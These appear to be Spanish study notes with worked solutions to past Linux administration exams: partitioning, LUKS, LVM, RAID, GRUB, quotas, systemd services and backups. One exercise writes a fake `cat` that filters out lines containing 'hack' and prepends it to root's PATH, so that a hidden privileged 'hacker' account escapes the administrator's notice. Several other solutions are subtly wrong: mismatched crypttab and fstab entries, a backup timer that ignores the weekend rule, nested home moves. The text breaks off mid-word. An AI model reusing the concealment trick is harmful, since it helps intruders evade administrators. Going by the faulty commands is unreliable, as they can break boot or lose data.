SCRIPTS Y EXAMENES PASADOS

## Índice

- [Ejercicio 1 TEMAS: Usuarios, particiones](#ejercicio-1-temas-usuarios-particiones)
- [Ejercicio 2 TEMAS: Usuarios](#ejercicio-2-temas-usuarios)
- [Ejercicio 3 TEMAS: Usuarios, instalacion de sw](#ejercicio-3-temas-usuarios-instalacion-de-sw)
- [Ejercicio 4 TEMAS: Usuarios, backups, scripts, system units](#ejercicio-4-temas-usuarios-backups-scripts-system-units)
- [Ejercicio 5 TEMAS: Usuarios, particiones](#ejercicio-5-temas-usuarios-particiones)
- [Ejercicio 1 TEMAS: scripts, system units, comandos "hack"](#ejercicio-1-temas-scripts-system-units-comandos-hack)
- [Ejercicio 2 TEMAS: servicios y targets](#ejercicio-2-temas-servicios-y-targets)
- [Ejercicio 3 TEMAS: arranque, particiones, RAIDS](#ejercicio-3-temas-arranque-particiones-raids)
- [Ejercicio 4 TEMAS: crear un RAID de nivel 5](#ejercicio-4-temas-crear-un-raid-de-nivel-5)
- [Ejercicio 5 TEMAS: instalación de sw](#ejercicio-5-temas-instalación-de-sw)
- [Ejercicio 1 TEMAS: arranque](#ejercicio-1-temas-arranque)
- [Ejercicio 2 TEMAS: redes, script, system units](#ejercicio-2-temas-redes-script-system-units)
- [Ejercicio 3 TEMAS: system units, comandos "hack"](#ejercicio-3-temas-system-units-comandos-hack)
- [Ejercicio 1 TEMAS: scripts](#ejercicio-1-temas-scripts)
- [Ejercicio 1 TEMAS: particiones, system units](#ejercicio-1-temas-particiones-system-units)
- [Ejercicio 3 TEMAS: servicio que falla](#ejercicio-3-temas-servicio-que-falla)
- [Ejercicio 4 TEMAS: falsos comandos](#ejercicio-4-temas-falsos-comandos)
- [Ejercicio 2 TEMAS: particiones](#ejercicio-2-temas-particiones)
- [Ejercicio 3 TEMAS: instalacion de sw y problemas de red](#ejercicio-3-temas-instalacion-de-sw-y-problemas-de-red)
- [Ejercicio 4 TEMAS: arranque](#ejercicio-4-temas-arranque)
- [Ejercicio 5 TEMAS: servicios y cambio de targets](#ejercicio-5-temas-servicios-y-cambio-de-targets)
- [Cambiar a una contraseña anterior](#cambiar-a-una-contraseña-anterior)
- [Gestionar logs de un servicio.](#gestionar-logs-de-un-servicio)
- [Ejercicio sobre crear LVMs](#ejercicio-sobre-crear-lvms)
- [Ejercicio acerca de la creacion y programacion de backUps](#ejercicio-acerca-de-la-creacion-y-programacion-de-backups)
- [Ejercicio acerca de los arranques de una opción por defecto](#ejercicio-acerca-de-los-arranques-de-una-opción-por-defecto)

# Ordinaria 2023

## Ejercicio 1 TEMAS: Usuarios, particiones
La política de reparto de recursos en tu empresa impone los siguiente 
condicionantes: 
- El directorio $HOME de los usuarios no debe alojarse en el mismo disco que el sistema de ficheros raíz. 
- Todos los usuarios deben disponer de una partición propia de aproximadamente el mismo tamaño, aprovechando todo el espacio disponible. 
- El usuario user1 maneja información delicada, por lo que su partición se protegerá con una encriptación de tipo LUKS.  
- En cada partición debe existir un sistema de ficheros de tipo ext4 que actuará como $HOME de cada usuario. 
Implementa la política descrita en tu máquina, haciendo las modificaciones pertinentes para que los usuarios cumplan los requisitos. No se debe perder el contenido previo de los usuarios, el cambio implementado debe ser transparente para ellos. No puedes emplear discos adicionales.

1. Crearemos las particiones para cada usuario. Pero primero verificaremos el espacio en el disco con `sudo fdisk -l /dev/sda`.
Antes de crear particiones debemos desmontar el punto de montaje en el que vayamos a hacer las operaciones.
Después crearemos las particiones con gdisk(Si son gpt, sin son MBR, fdisk), por ejemplo ` sudo gdisk /dev/sda2`. Con esto entramos en el menú y podemos crear las particiones. Ojo, no podemos hacerlo en la particion en la que está montado el sistema de ficheros raíz.
una vez creadas las particiones las formateamos a ext4 con `mkfs`.
Para hacer lo de LUKS tenemos que tener instalado cryptsetup.
`sudo apt-get install cryptsetup`.
Suponiendo que el usuario a encriptar tenga su particion en sda4:
```bash
sudo cryptsetup luksFormat /dev/sda4
sudo cryptsetup luksOpen /dev/sda4 user1_crypt
sudo mkfs.ext4 /dev/mapper/user1_crypt
```
Ahora (suponiendo que solo tenemos dos usuarios). Tendremos que montar sus particiones en un punto temporal:
```bash
sudo mkdir /mnt/user1 /mnt/user2
sudo mount /dev/mapper/user1_crypt /mnt/user1
sudo mount /dev/sda3 /mnt/user2
```
Copia los datos de los usuarios a las nuevas particiones usando rsync para preservar permisos y enlaces:
```bash
sudo rsync -a /home/user1/ /mnt/user1/
sudo rsync -a /home/user2/ /mnt/user2/
```
Actualizar fstab para montar las particiones automáticamente al inicio:
Edita /etc/fstab para añadir las entradas de las nuevas particiones.
Añade una entrada para user1 con LUKS:
```bash
echo 'user1_crypt /home/user1 ext4 defaults 0 2' | sudo tee -a /etc/fstab
```
Añade una entrada para user2 (suponiendo que es /dev/sda3):
```bash
echo '/dev/sda3 /home/user2 ext4 defaults 0 2' | sudo tee -a /etc/fstab
```
Configurar el sistema para que cryptsetup pida la clave al inicio:
Edita /etc/crypttab para añadir la entrada para user1:
```bash
echo 'user1_crypt /dev/sda2 none luks' | sudo tee -a /etc/crypttab
```

Por último tenemos que cambiar los puntos de anclaje de los usuarios.
```bash
sudo umount /mnt/user1
sudo umount /mnt/user2
sudo mount /home/user1
sudo mount /home/user2
```
Ahora si hicimos todo bien, al reiniciar deberia estar correcto.

## Ejercicio 2 TEMAS: Usuarios
Un usuario no puede acceder a su directorio de trabajo, solucionalo. 
Debemos encontrar el fallo. Posibilidades:
### 1. Permisos de Directorio

#### Problema:
Los permisos del directorio de trabajo de `user2` pueden estar configurados incorrectamente, impidiendo el acceso.

#### Solución:
Verifica y corrige los permisos:
```sh
sudo ls -ld /home/user2
sudo chmod 700 /home/user2
```

### 2. Propiedad del Directorio

#### Problema:
El directorio de trabajo puede no pertenecer a `user2`.

#### Solución:
Verifica y corrige la propiedad del directorio:
```sh
sudo chown user2:user2 /home/user2
```

### 3. Montaje del Directorio

#### Problema:
El directorio de trabajo de `user2` puede estar en una partición que no se ha montado correctamente.

#### Solución:
Verifica el archivo `/etc/fstab` y monta la partición si es necesario:
```sh
sudo mount -a
sudo mount /home/user2
```

### 4. Sistema de Archivos Corrupto

#### Problema:
El sistema de archivos de la partición que contiene el directorio de `user2` puede estar corrupto.

#### Solución:
Verifica y repara el sistema de archivos:
```sh
sudo umount /dev/sdaX    # Sustituir /dev/sdaX por la partición correspondiente
sudo fsck /dev/sdaX
sudo mount /dev/sdaX /home/user2
```

### 5. Cuota de Disco

#### Problema:
`user2` puede haber excedido su cuota de disco.

#### Solución:
Verifica la cuota de disco y ajusta si es necesario:
```sh
sudo repquota -a
sudo edquota -u user2
```

### 6. Perfil del Usuario

#### Problema:
El archivo de perfil del usuario (`.bashrc`, `.profile`, etc.) puede estar configurado incorrectamente o corrupto.

#### Solución:
Revisa y restaura los archivos de perfil desde una copia de seguridad o crea uno nuevo:
```sh
sudo mv /home/user2/.bashrc /home/user2/.bashrc.backup
sudo cp /etc/skel/.bashrc /home/user2/
sudo chown user2:user2 /home/user2/.bashrc
```

### 7. Configuración del Usuario en `/etc/passwd`

#### Problema:
La configuración del directorio de inicio de `user2` en `/etc/passwd` puede ser incorrecta.

#### Solución:
Verifica y corrige la configuración:
```sh
grep user2 /etc/passwd
# Debería verse algo como: user2:x:1001:1001::/home/user2:/bin/bash
sudo usermod -d /home/user2 user2
```

### 8. Restricciones de SELinux o AppArmor

#### Problema:
SELinux o AppArmor pueden estar aplicando restricciones que impiden el acceso.

#### Solución:
Verifica los logs de SELinux/AppArmor y ajusta las políticas si es necesario:
```sh
sudo ausearch -m avc -ts recent
sudo audit2allow -w -a
# Para AppArmor:
sudo aa-status
```

### 9. Problemas de Red o Montaje NFS (si aplica)

#### Problema:
Si el directorio de inicio está en un recurso NFS, puede haber problemas de red o montaje NFS.

#### Solución:
Verifica la conectividad de red y el estado del servicio NFS:
```sh
sudo systemctl status nfs-client.target
sudo showmount -e server_address   # Sustituir server_address por la dirección del servidor NFS
```

### 10. Bloqueo de Cuenta

#### Problema:
La cuenta de `user2` puede estar bloqueada.

#### Solución:
Verifica y desbloquea la cuenta:
```sh
sudo passwd -S user2
sudo passwd -u user2
```

### Pasos de Diagnóstico Detallados

1. **Verifica la propiedad y los permisos del directorio de inicio**:
   ```sh
   sudo ls -ld /home/user2
   ```

2. **Verifica la entrada en `/etc/passwd`**:
   ```sh
   grep user2 /etc/passwd
   ```

3. **Verifica si hay cuotas excedidas**:
   ```sh
   sudo repquota -a
   ```

4. **Verifica si hay mensajes relevantes en los logs del sistema**:
   ```sh
   sudo tail -n 100 /var/log/syslog
   sudo tail -n 100 /var/log/auth.log
   ```

5. **Prueba a cambiar de usuario e intentar acceder al directorio de inicio**:
   ```sh
   su - user2
   ```

6. **Verifica y monta todas las particiones**:
   ```sh
   sudo mount -a
   ```

## Ejercicio 3 TEMAS: Usuarios, instalacion de sw
Si el usuario `user3` tiene permisos sudo para instalar paquetes pero está experimentando problemas para hacerlo, hay varias posibilidades que podrían estar causando este problema. Aquí hay algunos pasos que podemos seguir para resolverlo:

### 1. Verificar los permisos sudo de user3

1. **Verificar la configuración de sudo**:
   ```sh
   sudo cat /etc/sudoers | grep user3
   ```

   Esto verificará si `user3` tiene los permisos adecuados en el archivo `sudoers`.

2. **Verificar el registro de autenticación de sudo**:
   ```sh
   sudo grep user3 /var/log/auth.log
   ```

   Esto te dará información sobre si `user3` ha intentado utilizar los privilegios de sudo recientemente.

### 2. Verificar la disponibilidad del comando `sudo`

1. **Verificar la ubicación de `sudo`**:
   ```sh
   which sudo
   ```

   Esto debería mostrarte la ubicación del comando `sudo`. Si no se muestra nada, puede haber un problema con la configuración de `sudo` en tu sistema.

### 3. Intentar instalar un paquete como user3

1. **Intentar instalar un paquete como user3**:
   ```sh
   sudo apt-get install calendar
   ```

   Esto intentará instalar el paquete `calendar` utilizando los privilegios de sudo del usuario `user3`. Si hay algún problema, deberías recibir un mensaje de error que puede proporcionar información sobre la causa del problema.

### 4. Verificar el registro de instalación de paquetes

1. **Verificar los registros de instalación de paquetes**:
   ```sh
   tail -n 50 /var/log/dpkg.log
   ```

   Esto te dará información sobre cualquier problema que pueda haber ocurrido durante la instalación de paquetes reciente.

### 5. Reiniciar el sistema

A veces, simplemente reiniciar el sistema puede resolver problemas que no son evidentes de otra manera:
```sh
sudo reboot
```

### 6. Verificar el espacio en disco

Si hay espacio insuficiente en disco, puede impedir la instalación de nuevos paquetes:
```sh
df -h
```

### 7. Verificar problemas de red

Si el sistema necesita descargar paquetes desde internet, problemas de red pueden causar fallas en la instalación. Verifica la conectividad de red:
```sh
ping google.com
```

### 8. Verificar problemas de repositorio

Si los paquetes no se pueden descargar de los repositorios, puede haber un problema con la configuración de los repositorios. Verifica los archivos de configuración de los repositorios en `/etc/apt/sources.list` y `/etc/apt/sources.list.d/`.

### 9. Verificar si hay bloqueos de apt

Si hay procesos de apt en ejecución, pueden bloquear la instalación de nuevos paquetes:
```sh
ps aux | grep apt
```

### 10. Verificar mensajes de error

Si recibes algún mensaje de error específico durante el intento de instalación de paquetes, busca en línea para encontrar posibles soluciones basadas en ese mensaje de error específico.

## Ejercicio 4 TEMAS: Usuarios, backups, scripts, system units
 El usuario user4 ha borrado de forma accidental un fichero de nombre critical.txt. Recupera dicho documento a través de los ficheros de backup (ficheros con extensión .dump). A través de systemd implementa una política de backup para el sistema de ficheros en el que se ubica el directorio $HOME del usuario en la que todos los días se realice un backup de nivel 1 a las 12:00 de la noche (excepto fines de semana), cuyo nombre tenga el formato [AÑO]-[MES]-[DÍA]_l1.dump. Dicho backup se almacena en la carpeta donde se encuentran los backups previos. 

El archivo perido estará en algún lugar donde se guarden los .dump.
puedes encontrarlos con `sudo find / -name "*.dump" -type f`.
Luego:
```sh
sudo cp /ruta/a/los/respaldos/backup_2024-05-30_l1.dump /ruta/a/la/carpeta/de/user4/
```

 Para hacer que home guarde backups crearemos un scipt (luego dale permisos).
 ```sh
 #!/bin/bash

# Directorio de respaldos
backup_dir="/ruta/a/los/respaldos"

# Directorio del sistema de archivos del usuario user4
user_home_dir="/home/user4"

# Nombre del archivo de respaldo con formato [AÑO]-[MES]-[DÍA]_l1.dump
backup_file="$backup_dir/$(date +'%Y-%m-%d')_l1.dump"

# Realizar el respaldo de nivel 1
sudo tar -cvf $backup_file --listed-incremental=$backup_dir/incremental_snapshot.snar $user_home_dir
```
Y después crearemos una unidad de servicio que lo utilice
Crea un archivo llamado `backup_service.service` en `/etc/systemd/system/` con el siguiente contenido:
```sh
[Unit]
Description=Backup Service for User4
After=network.target

[Service]
Type=oneshot
ExecStart=/ruta/al/script/backup_script.sh
```
Definir temporizador systemd para el respaldo diario:
Crea un archivo llamado `backup_timer.timer` en `/etc/systemd/system/` con el siguiente contenido:
```sh
[Unit]
Description=Backup Timer for Daily Backup
Requires=backup_service.service

[Timer]
OnCalendar=*-*-* 00:00:00
Persistent=true

[Install]
WantedBy=timers.target
```
Por ultimo acticaremos e iniciaremos el temporizador con systemctl:
```sh
sudo systemctl daemon-reload
sudo systemctl enable backup_timer.timer
sudo systemctl start backup_timer.timer
```

## Ejercicio 5 TEMAS: Usuarios, particiones
La política de gestión de usuarios de tu empresa ha cambiado, imponiendo ahora los siguiente condicionantes: 
- Todos los directorios de trabajo de los usuarios se ubicarán en un volumen lógico que se extiende a todos los discos disponibles (excepto el disco donde reside el sistema de ficheros raíz). Particiona dichos discos si fuera necesario. 
- El reparto de recursos se hace a través de cuotas, en las que el usuario2 dispone del 50% del espacio de almacenamiento y el resto de usuario se reparten el restante de manera lo más equitativa posible. Implementa la política descrita en tu máquina, haciendo las modificaciones pertinentes para que los usuarios cumplan los requisitos. No puedes emplear discos adicionales, trabaja con lo que tienes. 

### 1. Creación de un volumen lógico

1. **Identificar los discos disponibles**:
   - Usa el comando `lsblk` para ver los discos disponibles y sus tamaños.

2. **Particionar los discos si es necesario**:
   - Si los discos no están particionados, usa `fdisk` o `gdisk` para crear particiones en ellos.

3. **Crear un volumen lógico**:
   - Utiliza `lvm` para crear un grupo de volúmenes y un volumen lógico que se extienda a todos los discos disponibles, excepto el disco del sistema de archivos raíz.

   ```sh
   # Crear un nuevo grupo de volúmenes
   sudo vgcreate nombre_del_grupo_de_volúmenes /dev/sdX /dev/sdY

   # Crear un volumen lógico que se extienda a todos los discos disponibles excepto el raíz
   sudo lvcreate -l 100%FREE -n lv_users nombre_del_grupo_de_volúmenes
   ```

### 2. Movimiento de directorios de trabajo de usuarios

1. **Crear directorios de trabajo para los usuarios**:
   - Creamos los directorios de trabajo para los usuarios en el nuevo volumen lógico.

   ```sh
   sudo mkdir /mnt/lv_users/user1
   sudo mkdir /mnt/lv_users/user2
   sudo mkdir /mnt/lv_users/user3
   sudo mkdir /mnt/lv_users/user4
   # Y así sucesivamente para todos los usuarios
   ```

2. **Mover los directorios de trabajo existentes**:
   - Movemos los directorios de trabajo de los usuarios existentes al nuevo volumen lógico.

   ```sh
   sudo mv /home/user1 /mnt/lv_users/user1
   sudo mv /home/user2 /mnt/lv_users/user2
   sudo mv /home/user3 /mnt/lv_users/user3
   sudo mv /home/user4 /mnt/lv_users/user4
   # Y así sucesivamente para todos los usuarios
   ```

### 3. Configuración de cuotas de disco

1. **Instalar herramientas de cuotas (si no están instaladas)**:

   ```sh
   sudo apt-get install quota
   ```

2. **Habilitar cuotas en el sistema de archivos del volumen lógico**:
   - Edita el archivo `/etc/fstab` para agregar la opción `usrquota,grpquota` al montar el volumen lógico.
   - Ejemplo de entrada en `/etc/fstab`:

     ```
     /dev/nombre_del_grupo_de_volúmenes/lv_users  /mnt/lv_users  ext4  defaults,usrquota,grpquota  0  2
     ```

3. **Remontar el volumen lógico**:

   ```sh
   sudo mount -o remount /mnt/lv_users
   ```

4. **Configurar cuotas de disco para los usuarios**:

   ```sh
   # Habilitar cuotas para el sistema de archivos
   sudo quotacheck -cug /mnt/lv_users
   sudo quotaon /mnt/lv_users

   # Establecer cuotas para el usuario2 (50% del espacio)
   sudo edquota -u user2
   # Establecer cuotas equitativas para los demás usuarios
   ```

Con estos pasos, has implementado la nueva política de gestión de usuarios en tu empresa, asegurando que los directorios de trabajo de los usuarios se ubiquen en un volumen lógico que se extienda a todos los discos disponibles (excepto el disco raíz del sistema de archivos) y que el reparto de recursos se realice mediante cuotas de disco según los porcentajes especificados.

# Ordinaria 21-22

## Ejercicio 1 TEMAS: scripts, system units, comandos "hack"
Arranca la máquina desde el snapshot Ej1Begin. En dicha máquina comprobarás que hay un usuario de nombre “hacker” que tiene permisos completos a través de sudo. Queremos que sea un usuario “oculto” para el administrador, y como primer paso vamos a “crear” algunos comandos a medida. Crea un Shell script de nombre cat que realice las mismas tareas que el comando original (asumimos que recibe un fichero como único parámetro), con la única excepción de que las líneas que contienen el string “hack” no se imprimen por pantalla (así no se detectará su presencia en ficheros como /etc/passwd, /etc/shadow, etc.). Una vez finalizado, lleva a cabo las acciones necesarias para que el usuario root utilice tu script siempre que tenga intención de ejecutar el comando cat. El resto de usuario usarán el comando cat original del sistema. 

Primero crearemos el script llamado **cat**.
Con la opcion `-v` de `grep` hacemos que se muestren todas las lineas menos las que tengan la palabra indicada.

```bash
#!/bin/bash
grep -v "hack" "$1"
```

Lo guardamos en el directorio `usr/local/bin` que es accesible por root y le damos permisos.
`sudo chmod +x /usr/local/bin/cat`.

Ahora, cómo hacemos que se ejecute este en vez de cat original?
Tenemos que modificar el PATH de root.
Entramos en su .bashrc y cambiamos la linea que hace export PATH.

```sh
sudo nano /root/.bashrc

export PATH=/usr/local/bin:$PATH
```
Esto hará que se ejecute el cat creado por nosotros en vez del original.

## Ejercicio 2 TEMAS: servicios y targets
 Vamos a crear un servicio de usuarios “volátiles”. Dicho servicio, de nombre volatile-user.service, será de tipo oneshot e incluirá la directiva “RemainAfterExit=yes”. Su función será crear un usuario con las especificaciones indicadas a continuación cuando se arranque la máquina. Cuando se apague la máquina, el mismo servicio se encargará de eliminar COMPLETAMENTE al usuario creado. El servicio se debe iniciar en el modo de operación multiuser y se debe ejecutar antes que los servicios de acceso (systemd-logind.service y sshd.service). Los parámetros de configuración del usuario serán los siguientes:  username=tmpuser, password=temporal, UID=10000, GID=100, Shell tipo bash, directorio home: /home/tmpuser.Crea el servicio y comprueba su correcto funcionamiento. Anota en /root/README.txt como has hecho las comprobaciones. 


Primero creamos el script asociado al servicio (y le damos permisos (`sudo chmod +x /usr/local/bin/manage_tmpuser.sh`)):
```sh
#!/bin/bash
# switch para decidir que hacer en caso de start o stop
case "$1" in
    start)
        # Crear el usuario
        useradd -m -d /home/tmpuser -s /bin/bash -u 10000 -g 100 tmpuser
        echo "tmpuser:temporal" | chpasswd
        ;;
    stop)
        # Eliminar el usuario y su directorio home
        userdel -r tmpuser
        ;;
    *)
        echo "Usage: $0 {start|stop}"
        exit 1
        ;;
esac
```
Ahora creamos el servicio `volatile-user.service` en `/etc/systemd/system/`que usa este script de acuerdo a las especificaciones dadas.
```sh
[Unit]
Description=Volatile User Service
After=network.target
Before=systemd-logind.service sshd.service
ConditionPathExists=!/etc/nologin

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=/usr/local/bin/manage_tmpuser.sh start
ExecStop=/usr/local/bin/manage_tmpuser.sh stop

[Install]
WantedBy=multi-user.target
```


Explicación del archivo volatile-user.service:

[Unit]
- Description=Volatile User Service:
  Proporciona una breve descripción del servicio. Este texto se muestra cuando se visualiza el estado del servicio o se listan los servicios disponibles.
  
- After=network.target:
  Indica que este servicio debe iniciarse después de que la red esté configurada y lista. network.target es un objetivo genérico que representa la configuración de red.
  
- Before=systemd-logind.service sshd.service:
  Indica que este servicio debe iniciarse antes de los servicios systemd-logind.service (el servicio de login de systemd) y sshd.service (el servidor SSH). Esto asegura que el usuario tmpuser esté creado antes de que se permitan inicios de sesión.
  
- ConditionPathExists=!/etc/nologin:
  Este servicio no se ejecutará si el archivo /etc/nologin existe. Este archivo generalmente se usa para deshabilitar el inicio de sesión en el sistema, por lo que este servicio no debería ejecutarse en esas condiciones.

[Service]
- Type=oneshot:
  Indica que el servicio realiza una acción corta y luego finaliza. No es un servicio que se ejecute continuamente en segundo plano.
  
- RemainAfterExit=yes:
  Asegura que el servicio se considere activo incluso después de que el proceso especificado en ExecStart haya finalizado. Esto es importante porque queremos que ExecStop se ejecute al detener o apagar el servicio.
  
- ExecStart=/usr/local/bin/manage_tmpuser.sh start:
  Especifica el comando que se ejecutará cuando se inicie el servicio. En este caso, ejecuta el script con el argumento start, lo que crea el usuario tmpuser.
  
- ExecStop=/usr/local/bin/manage_tmpuser.sh stop:
  Especifica el comando que se ejecutará cuando se detenga el servicio. En este caso, ejecuta el script con el argumento stop, lo que elimina el usuario tmpuser.

[Install]
- WantedBy=multi-user.target:
  Indica que este servicio se activará cuando el sistema entre en el estado multi-user.target, que es un estado típico de operación multiusuario con servicios de red activos, pero sin entorno gráfico. Esto asegura que el servicio se ejecute en el modo de operación multiusuario.

Resumen del Funcionamiento
1. Al iniciar el servicio:
   - El script manage_tmpuser.sh start se ejecuta, creando el usuario tmpuser con las especificaciones dadas (UID, GID, shell, etc.).

2. Durante la operación normal del sistema:
   - El servicio se considera activo debido a RemainAfterExit=yes, aunque el script haya finalizado.

3. Al detener el servicio (por ejemplo, al apagar el sistema):
   - El script manage_tmpuser.sh stop se ejecuta, eliminando completamente al usuario tmpuser.

Esta configuración asegura que el usuario tmpuser exista solo durante la operación normal del sistema y sea eliminado automáticamente al detener el servicio, manteniendo así la seguridad y limpieza del sistema.

Ahora deberemos habilitar y probar el servicio

Habilita el servicio para que se inicie automáticamente en el arranque:
```sh
sudo systemctl enable volatile-user.service
```

Inicia el servicio manualmente para probar su funcionamiento:
```sh
sudo systemctl start volatile-user.service
```
Verifica que el usuario tmpuser ha sido creado:
```sh
getent passwd tmpuser
# Deberías ver una línea similar a:
# tmpuser:x:10000:100::/home/tmpuser:/bin/bash
```

Verifica que el usuario puede autenticarse con la contraseña temporal:
```sh
su - tmpuser
# Introduce la contraseña "temporal" para acceder al shell del usuario tmpuser
```

Ahora verificaremos que el usuario se elimine al apagar la maquina (con detener el servicio serviría).
```sh
sudo systemctl stop volatile-user.service

getent passwd tmpuser
# No deberías ver ninguna salida
```
Y ahora escribiriamos los pasos realizados en el readme:
```md
# Comprobaciones para el servicio volatile-user.service

1. Habilitar el servicio:
   sudo systemctl enable volatile-user.service

2. Iniciar el servicio manualmente para probar:
   sudo systemctl start volatile-user.service

3. Verificar que el usuario tmpuser ha sido creado:
   getent passwd tmpuser

4. Verificar que el usuario puede autenticarse:
   su - tmpuser
   # Contraseña: temporal

5. Detener el servicio para eliminar el usuario:
   sudo systemctl stop volatile-user.service

6. Verificar que el usuario ha sido eliminado:
   getent passwd tmpuser
```


## Ejercicio 3 TEMAS: arranque, particiones, RAIDS
 Arranca la máquina desde el snapshot Ej3Begin. Estás trabajando con un sistema Debian que dispone de un disco adicional en el que se ha creado una partición e instalado el sistema de ficheros raíz de una distribución alternativa de Linux (Lubuntu). Para gestionar el uso de ambos sistemas, lleva a cabo las siguientes tareas: 
1. Crea una nueva entrada en el BootLoader del sistema Debian que te permita arrancar la distribución Lubuntu. Limita el contenido de dicha entrada a los elementos estrictamente necesarios (kernel, ramdisk y sistema de ficheros raíz). La nueva entrada será la que arranque por defecto de forma permanente. 
2. Hemos extraviado el password de root del sistema Lubuntu. Lleva a cabo las tareas necesarias para que dicho password sea el mismo que el de la distribución ebian. 
3. Lleva a cabo las tareas pertinentes para unificar los directorios de trabajo (directorios $HOME) de los usuarios de ambos sistemas operativos, de tal forma que independientemente del sistema que se arranque el contenido sea el mismo siempre. Para realizar tus comprobaciones puedes trabajar con el usuario jalberto (password: jalberto). 

### Tarea 1
Primero montamos la partición de Lubuntu y obtenemos el kernel y ramdisk. (Anota los nombres del kernel (por ejemplo, vmlinuz-x.x.x-xx-generic) y el ramdisk (por ejemplo, initrd.img-x.x.x-xx-generic).)
```sh
sudo mount /dev/sdb1 /mnt
sudo ls /mnt/boot
```
Creamos una entrada en el GRUB
```sh
sudo nano /etc/grub.d/40_custom
# Escribimos:
menuentry "Lubuntu" {
    set root=(hd1,1)
    linux /boot/vmlinuz-x.x.x-xx-generic root=/dev/sdb1 ro quiet
    initrd /boot/initrd.img-x.x.x-xx-generic
}
```
IMPORTANTE: ACTUALIZAMOS EL GRUB `sudo update-grub`.
Configuramos Lubuntu como la entrada por defecto:
```sh
sudo nano /etc/default/grub
# buscamos la linea: GRUB_DEFAULT=0
# La remplazamos por:
GRUB_DEFAULT="Lubuntu"
``` 
Y volvemos a actualizar el GRUB `sudo update-grub`.

### Tarea 2
Recuperar la contraseña de root
 Primero montamos las particiones:
 ```sh 
sudo mount /dev/sdb1 /mnt
sudo mount --bind /dev /mnt/dev
sudo mount --bind /proc /mnt/proc
sudo mount --bind /sys /mnt/sys
 ```
Entramos en el sistema lubuntu con chroot y cambiamos la contraseña:
```bash
sudo chroot /mnt
passwd root
```
Y por ultimo salimos de chroot y desmontamos las particiones
```sh
exit
sudo umount /mnt/dev
sudo umount /mnt/proc
sudo umount /mnt/sys
sudo umount /mnt
```

### Tarea 3
Unificar los directorios de trabajo

1. **Montar el directorio home de Lubuntu en el directorio home de Debian**:
    Primero, asegúrate de que ambos sistemas tengan el mismo usuario `jalberto`.

    **Montar manualmente**:
    ```bash
    sudo mount /dev/sdb1 /mnt
    ```

    Luego, monta el directorio `/home` de Lubuntu en el directorio `/home` de Debian:
    ```bash
    sudo mount --bind /mnt/home /home
    ```

    **Hacer la montura persistente**:
    Edita el archivo `/etc/fstab`:
    ```bash
    sudo nano /etc/fstab
    ```

    Agrega la siguiente línea para hacer que el montaje sea permanente:
    ```bash
    /mnt/home   /home   none    bind    0   0
    ```

2. **Verificar que el usuario jalberto puede acceder a su directorio home en ambos sistemas**:
    Inicia sesión en Debian:
    ```bash
    su - jalberto
    # Verifica que el directorio home es el correcto y contiene los archivos esperados.
    ```

    Reinicia el sistema y selecciona Lubuntu desde el menú GRUB:
    ```bash
    # Inicia sesión en Lubuntu como jalberto y verifica el acceso a los archivos.
    ```

Con estos pasos, habrás unificado los directorios de trabajo de los usuarios en ambos sistemas.

## Ejercicio 4 TEMAS: crear un RAID de nivel 5

### Paso 1: Particionar los discos

1. **Identificar los discos**:
    Utiliza `lsblk` o `fdisk -l` para identificar los discos disponibles. Supongamos que los discos son `/dev/sdb`, `/dev/sdc`, y `/dev/sdd`.

2. **Particionar los discos**:
    Para cada disco, crea una única partición que ocupe el 100% del disco.

    ```bash
    sudo fdisk /dev/sdb
    # Comandos dentro de fdisk:
    # n -> nueva partición
    # p -> partición primaria
    # 1 -> número de partición
    # enter -> usar el valor por defecto para el primer sector
    # enter -> usar el valor por defecto para el último sector
    # w -> escribir los cambios

    sudo fdisk /dev/sdc
    sudo fdisk /dev/sdd
    ```

### Paso 2: Crear el RAID

1. **Instalar mdadm si no está instalado**:
    ```bash
    sudo apt-get install mdadm
    ```

2. **Crear el RAID 5**:
    ```bash
    sudo mdadm --create --verbose /dev/md0 --level=5 --raid-devices=3 /dev/sdb1 /dev/sdc1 /dev/sdd1
    ```

3. **Verificar el estado del RAID**:
    ```bash
    cat /proc/mdstat
    ```

### Paso 3: Crear el sistema de archivos

1. **Crear el sistema de archivos en el dispositivo RAID**:
    ```bash
    sudo mkfs.ext4 /dev/md0
    ```

### Paso 4: Montar el RAID y mover /home

1. **Crear el punto de montaje**:
    ```bash
    sudo mkdir /mnt/raid_home
    ```

2. **Montar el dispositivo RAID**:
    ```bash
    sudo mount /dev/md0 /mnt/raid_home
    ```

3. **Copiar el contenido de /home al RAID**:
    ```bash
    sudo rsync -av /home/ /mnt/raid_home/
    ```

4. **Montar el RAID como /home permanentemente**:
    Edita el archivo `/etc/fstab`:
    ```bash
    sudo nano /etc/fstab
    ```

    Agrega la siguiente línea:
    ```bash
    /dev/md0    /home   ext4    defaults    0   2
    ```

5. **Montar el sistema de archivos**:
    ```bash
    sudo umount /home
    sudo mount -a
    ```

### Paso 5: Activar y configurar cuotas de disco

1. **Instalar cuotas si no están instaladas**:
    ```bash
    sudo apt-get install quota
    ```

2. **Activar cuotas en el archivo /etc/fstab**:
    Edita el archivo `/etc/fstab` y modifica la línea para `/home`:
    ```bash
    /dev/md0    /home   ext4    defaults,usrquota,grpquota    0   2
    ```

3. **Remontar el sistema de archivos**:
    ```bash
    sudo mount -o remount /home
    ```

4. **Crear archivos de cuotas**:
    ```bash
    sudo quotacheck -cum /home
    sudo quotaon /home
    ```

5. **Establecer cuotas para usuarios**:
    ```bash
    sudo edquota -u ltorvalds
    sudo edquota -u rstallman
    ```

    En el editor que se abre, establece los límites de espacio a 100MB y el número máximo de archivos a 100.

### Paso 6: Comprobación

1. **Verificar que las cuotas están activas**:
    ```bash
    sudo repquota -a
    ```

2. **Comprobar que los usuarios tienen los límites establecidos**:
    Inicia sesión como `ltorvalds` y `rstallman` e intenta crear archivos hasta alcanzar los límites establecidos.

Con estos pasos, habrás configurado un RAID 5, movido el directorio `/home` al RAID, activado las cuotas de disco, y establecido límites para los usuarios `ltorvalds` y `rstall


## Ejercicio 5 TEMAS: instalación de sw

### Lleva a cabo las reparaciones necesarias para instalar, mediante el comando apt, el paquete pacman4console

La instalación de un paquete mediante `apt` podría fallar por varios motivos. Aquí tienes una lista de posibles problemas y sus soluciones para el paquete `pacman4console`:

1. **Paquete no disponible en los repositorios configurados**:
   - **Motivo**: El paquete `pacman4console` puede no estar presente en los repositorios configurados en tu sistema.
   - **Solución**: Verifica que tienes los repositorios correctos configurados en `/etc/apt/sources.list` y en los archivos dentro de `/etc/apt/sources.list.d/`.

   **Esta configuracion deberia hacer que funcione:**
   ```bash
